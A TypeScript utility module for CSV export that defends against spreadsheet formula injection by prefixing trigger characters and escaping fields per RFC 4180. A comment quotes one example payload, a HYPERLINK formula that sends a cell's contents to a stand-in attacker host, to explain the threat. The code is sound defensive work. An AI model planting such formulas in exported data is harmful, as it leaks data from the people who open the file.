/**
 * Characters that make Excel, LibreOffice, and Google Sheets treat a cell as a
 * formula rather than text. Leading tab and CR are included because the
 * spreadsheet strips them before deciding.
 */
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Neutralizes CSV/formula injection. Exported field values include names,
 * messages, and dedications typed by anonymous visitors, and these files are
 * opened by staff — so `=HYPERLINK("https://evil.example?d="&A1,"Click")` in a
 * contact form would otherwise execute on the admin's machine. RFC 4180
 * quoting does not prevent this; the spreadsheet unquotes before evaluating.
 *
 * Prefixing with a single quote is the standard mitigation: spreadsheets treat
 * the rest of the cell as literal text and hide the quote itself.
 */
function neutralizeFormula(str: string): string {
  return FORMULA_TRIGGERS.some((char) => str.startsWith(char)) ? `'${str}` : str;
}

/** Escapes a single CSV field per RFC 4180: quote it if it contains a comma, quote, or newline. */
function escapeCsvField(value: unknown): string {
  const str = neutralizeFormula(value === null || value === undefined ? "" : String(value));
  if (/[",\n\r]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

/** Builds a CSV document (with header row) from an array of flat records. */
export function toCsv<T extends Record<string, unknown>>(rows: T[], columns: (keyof T & string)[]): string {
  const header = columns.map(escapeCsvField).join(",");
  const lines = rows.map((row) => columns.map((col) => escapeCsvField(row[col])).join(","));
  return [header, ...lines].join("\r\n") + "\r\n";
}

export function csvFilename(prefix: string): string {
  const timestamp = new Date().toISOString().slice(0, 10);
  return `${prefix}-${timestamp}.csv`;
}
